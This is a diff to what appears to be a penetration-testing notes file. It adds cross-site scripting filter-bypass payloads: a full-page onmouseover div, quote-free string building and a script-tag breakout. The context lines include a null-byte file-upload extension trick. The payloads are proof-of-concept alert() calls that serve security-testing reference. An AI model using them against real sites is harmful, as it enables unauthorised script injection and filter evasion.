@@ -341,6 +341,31 @@ return+false});      Finish the jQuery click function
 alert`xss`;              Here we can execute our code
 </script>               This closes the script tag to prevent JavaScript parsing errors
 ```
+
+#### Html tag only xss
+Sometimes, the websites only filters some dangerous input like <script>. But still allows <p>, <h1> those kind of html tag. In this way. following payloads can be used:
+   
+```
+<div onmouseover="alert(1)" style="position:fixed;left:0;top:0;width:9999px;height:9999px;"></div>
+```
+
+#### filter not allowing "
+Came accross a xss filter that not allows to use ". Thus, <script>alert(1);</script> works. But <script>alert("abc");</script> does not work. Now, below payload can be used to bypass:
+
+```
+var x = String(/This contains no quotes/);
+x = x.substring(1, x.length-1);
+alert(x);
+```
+
+#### Script kept pompting "Uncaught SyntaxError: Invalid or unexpected token" in console
+
+To bypass:
+
+```
+"}; <script>alert(1);</script> //
+```
+
 <a name="AFU"></a>
 ### Arbitrary File Upload
 
@@ -350,7 +375,6 @@ alert`xss`;              Here we can execute our code
 Beacon.html%00.pdf (or other extension which is allowed by the service e.g. .jpg)
 
 ```
-
 
 <a name ="symfony"></a>
 ### Symfony
